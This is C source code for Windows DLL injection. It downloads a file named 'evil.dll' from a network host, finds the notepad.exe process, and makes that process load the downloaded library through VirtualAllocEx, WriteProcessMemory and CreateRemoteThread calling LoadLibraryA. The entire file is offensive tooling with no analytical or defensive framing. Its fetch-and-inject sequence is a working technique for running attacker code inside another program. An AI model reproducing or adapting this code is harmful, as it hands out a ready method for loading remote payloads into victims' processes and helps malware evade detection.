#include <stdio.h>;
#include <stdlib.h>;
#include <string.h>;
#include <windows.h>;
#include <tlhelp32.h>;
#include <wininet.h>;
#include "download.h";
 
#pragma comment (lib, "wininet.lib")
 
int getPIDbyProcName(const char* procName) {
    int pid = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(hSnap, &pe32) != FALSE) {
        while (pid == 0 && Process32Next(hSnap, &pe32) != FALSE) {
            if (strcmp(pe32.szExeFile, procName) == 0) {
                pid = pe32.th32ProcessID;
            }
        }
    }
    CloseHandle(hSnap);
    return pid;
}
 
int main(int argc, char* argv[]) {
  int pid = 0;
  HANDLE ph; // process handle
  HANDLE rt; // remote thread
  LPVOID rb; // remote buffer
  bool success = false;
  const char evilDLL[] = "C:\\Users\\user\\evil.dll";
 
  // handle to kernel32 and pass it to GetProcAddress
  HMODULE hKernel32 = GetModuleHandle("Kernel32");
  VOID *lb = GetProcAddress(hKernel32, "LoadLibraryA");
  success = downloadFile("http://192.168.0.63/evil.dll", evilDLL);
  if (!success) {
    printf("Failed to download evil.dll");
    return 1;
  }
  pid = getPIDbyProcName("notepad.exe");
 
  int evilLen = strlen(evilDLL);
 
  ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid));
 
  // allocate memory buffer for remote process
  rb = VirtualAllocEx(ph, NULL, evilLen, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
 
  // "copy" evil DLL between processes
  WriteProcessMemory(ph, rb, evilDLL, evilLen, NULL);
 
  // our process start new thread
  rt = CreateRemoteThread(ph, NULL, 0, (LPTHREAD_START_ROUTINE)lb, rb, 0, NULL);
  CloseHandle(ph);
  return 0;
}